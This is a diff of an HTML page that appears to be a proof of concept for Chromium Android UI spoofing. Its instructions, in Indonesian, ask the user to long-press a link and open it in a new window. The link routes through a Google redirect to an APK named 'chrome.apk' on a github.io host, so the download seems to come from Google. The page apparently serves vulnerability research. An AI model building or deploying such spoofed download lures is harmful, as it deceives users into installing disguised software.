@@ -1,27 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;   /* Tengah horizontal */
-      align-items: center;       /* Tengah vertikal */
-      height: 100vh;             /* Tinggi full layar */
-      margin: 0;
-    }
-
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC UI Spoofing & Google Redirect</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f4f4f9;
+        }
+        h1 {
+            color: #333;
+        }
+        .container {
+            margin-top: 30px;
+        }
+        a.button-link {
+            display: inline-block;
+            margin: 15px;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            text-decoration: none;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: background 0.2s;
+        }
+        a.button-link:hover {
+            background-color: #1557b0;
+        }
+    </style>
 </head>
 <body>
 
-<a href="https://ecdnts-del.github.io/spoof/download.html" target="_blank">
-  <button>ðŸ”— click here</button>
-</a>
+    <h1>Chromium Android UI Spoofing PoC</h1>
+    <p>Silakan long-press tautan di bawah dan pilih "Open in new window":</p>
+
+    <div class="container">
+        <!-- Tautan 1: Membuka Google melalui URL Redirect -->
+        <div>
+            <a href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" 
+               class="button-link" 
+               target="_blank" 
+               rel="noopener noreferrer">
+                Open New Window (Google.com Context)
+            </a>
+        </div>
+    </div>
 
 </body>
 </html>
